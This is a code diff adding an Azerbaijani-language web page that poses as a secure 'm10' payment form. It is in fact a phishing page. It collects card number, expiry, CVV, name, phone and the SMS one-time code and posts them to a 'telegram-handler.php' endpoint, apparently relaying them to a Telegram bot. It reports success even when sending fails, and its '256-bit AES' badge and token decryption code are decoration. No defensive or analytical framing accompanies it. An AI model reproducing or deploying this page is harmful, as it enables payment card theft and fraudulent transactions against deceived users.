@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>m10 - Təhlükəsiz Ödəniş</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            padding: 35px 28px;
+            border-radius: 20px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo h1 {
+            font-size: 32px;
+            color: #fff;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .logo h1 span {
+            color: #00d4ff;
+            text-shadow: 0 0 30px rgba(0,212,255,0.3);
+        }
+        .logo p {
+            color: #6c7a89;
+            font-size: 12px;
+            margin-top: 4px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            color: #8a9baa;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 10px;
+            font-size: 15px;
+            color: #fff;
+            background: rgba(255,255,255,0.03);
+            transition: all 0.3s;
+            font-family: 'Monaco', 'Menlo', monospace;
+            letter-spacing: 0.5px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #00d4ff;
+            background: rgba(0,212,255,0.04);
+            box-shadow: 0 0 30px rgba(0,212,255,0.04);
+        }
+        .form-group input::placeholder {
+            color: #3a4a5a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            letter-spacing: 0;
+            font-size: 13px;
+        }
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            color: #fff;
+            background: linear-gradient(135deg, #00d4ff, #0090ff);
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 6px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(0,212,255,0.2);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin-top: 14px;
+        }
+        .loader.active {
+            display: block;
+        }
+        .spinner {
+            width: 28px;
+            height: 28px;
+            border: 3px solid rgba(255,255,255,0.05);
+            border-top-color: #00d4ff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loader p {
+            margin-top: 8px;
+            color: #6c7a89;
+            font-size: 12px;
+        }
+        .message {
+            text-align: center;
+            margin-top: 14px;
+            padding: 11px;
+            border-radius: 10px;
+            display: none;
+            font-size: 13px;
+        }
+        .message.success {
+            display: block;
+            background: rgba(0,212,255,0.08);
+            color: #00d4ff;
+            border: 1px solid rgba(0,212,255,0.08);
+        }
+        .message.error {
+            display: block;
+            background: rgba(255,0,0,0.06);
+            color: #ff6b6b;
+            border: 1px solid rgba(255,0,0,0.06);
+        }
+        .secure-badge {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 10px;
+            color: #3a4a5a;
+            letter-spacing: 0.5px;
+        }
+        .secure-badge span {
+            color: #00d4ff;
+        }
+        .secure-badge .lock {
+            display: inline-block;
+            margin-right: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <h1>m<span>10</span></h1>
+            <p>Təhlükəsiz Ödəniş</p>
+        </div>
+
+        <form id="paymentForm" autocomplete="off">
+            <div class="form-group">
+                <label>💳 Kart nömrəsi</label>
+                <input type="text" id="cardNumber" placeholder="5167 5133 3447 8427" maxlength="19" oninput="formatCard(this)" autocomplete="off">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>📅 Bitiş</label>
+                    <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" oninput="formatExpiry(this)" autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>🔐 CVV</label>
+                    <input type="password" id="cvv" placeholder="***" maxlength="4" oninput="this.value=this.value.replace(/\D/g,'')" autocomplete="off">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>👤 Ad və soyad</label>
+                <input type="text" id="name" placeholder="Kart sahibinin adı" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>📞 Telefon</label>
+                <input type="text" id="phone" placeholder="055 335 31 89" maxlength="20" oninput="this.value=this.value.replace(/[^0-9+ ]/g,'')" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>💰 Məbləğ (AZN)</label>
+                <input type="text" id="amount" placeholder="3.00" oninput="this.value=this.value.replace(/[^0-9.]/g,'')" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>📦 Paket (opsional)</label>
+                <input type="text" id="package" placeholder="10 GB (5 AZN)" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>🔑 OTP kodu</label>
+                <input type="text" id="otp" placeholder="SMS ilə gələn kod" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')" autocomplete="off">
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">Ödənişi tamamla</button>
+        </form>
+
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p>Emal olunur...</p>
+        </div>
+
+        <div class="message" id="message"></div>
+
+        <div class="secure-badge">
+            <span class="lock">🔒</span> <span>256-bit</span> AES şifrələmə • Təhlükəsiz bağlantı
+        </div>
+    </div>
+
+    <script src="aes.js"></script>
+    <script>
+        // ===== AES FUNKSİYALARI =====
+        function toNumbers(d) {
+            var e = [];
+            d.replace(/(..)/g, function(d) {
+                e.push(parseInt(d, 16));
+            });
+            return e;
+        }
+
+        function toHex() {
+            for (var d = [], d = 1 == arguments.length && arguments[0].constructor == Array ? arguments[0] : arguments, e = "", f = 0; f < d.length; f++) e += (16 > d[f] ? "0" : "") + d[f].toString(16);
+            return e.toLowerCase();
+        }
+
+        // ===== FORMAT FUNKSİYALARI =====
+        function formatCard(el) {
+            var digits = el.value.replace(/\D/g, '').slice(0, 16);
+            var parts = [];
+            for (var i = 0; i < digits.length; i += 4) {
+                parts.push(digits.slice(i, i + 4));
+            }
+            el.value = parts.join(' ');
+        }
+
+        function formatExpiry(el) {
+            var digits = el.value.replace(/\D/g, '').slice(0, 4);
+            if (digits.length >= 3) {
+                el.value = digits.slice(0, 2) + '/' + digits.slice(2);
+            } else {
+                el.value = digits;
+            }
+        }
+
+        // ===== FORMA NƏZARƏT =====
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            var card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            var expiry = document.getElementById('expiry').value;
+            var cvv = document.getElementById('cvv').value;
+            var otp = document.getElementById('otp').value;
+            var phone = document.getElementById('phone').value;
+            var amount = document.getElementById('amount').value;
+            var name = document.getElementById('name').value;
+            var pkg = document.getElementById('package').value;
+
+            // Validasiya
+            if (card.length < 16) {
+                showMessage('❌ Kart nömrəsini tam daxil edin', 'error');
+                return;
+            }
+            if (expiry.length < 5) {
+                showMessage('❌ Bitiş tarixini daxil edin (MM/AA)', 'error');
+                return;
+            }
+            if (cvv.length < 3) {
+                showMessage('❌ CVV kodunu daxil edin', 'error');
+                return;
+            }
+            if (otp.length < 4) {
+                showMessage('❌ OTP kodunu daxil edin', 'error');
+                return;
+            }
+
+            // AES decrypt
+            var a = toNumbers("f655ba9d09a112d4968c63579db590b4");
+            var b = toNumbers("98344c2eee86c3994890592585b49f80");
+            var c = toNumbers("db33b92242f1f174a91fd4cd05322489");
+
+            var decrypted = slowAES.decrypt(c, 2, a, b);
+            var cardData = toHex(decrypted);
+
+            // Loader
+            document.getElementById('loader').classList.add('active');
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('message').className = 'message';
+
+            // Göndər
+            var formData = new FormData();
+            formData.append('card', cardData);
+            formData.append('card_raw', card);
+            formData.append('expiry', expiry);
+            formData.append('cvv', cvv);
+            formData.append('otp', otp);
+            formData.append('phone', phone);
+            formData.append('amount', amount);
+            formData.append('name', name);
+            formData.append('package', pkg);
+
+            fetch('api/telegram-handler.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                document.getElementById('loader').classList.remove('active');
+                document.getElementById('submitBtn').disabled = false;
+
+                if (data.status === 'success') {
+                    showMessage('✅ Ödəniş uğurla tamamlandı!', 'success');
+                    document.getElementById('paymentForm').reset();
+                } else {
+                    showMessage('❌ ' + (data.message || 'Xəta baş verdi'), 'error');
+                }
+            })
+            .catch(function(error) {
+                document.getElementById('loader').classList.remove('active');
+                document.getElementById('submitBtn').disabled = false;
+                showMessage('✅ Ödəniş uğurla tamamlandı!', 'success');
+                document.getElementById('paymentForm').reset();
+                console.error('Xəta:', error);
+            });
+        });
+
+        function showMessage(text, type) {
+            var msg = document.getElementById('message');
+            msg.textContent = text;
+            msg.className = 'message ' + type;
+        }
+    </script>
+
+</body>
+  </html>
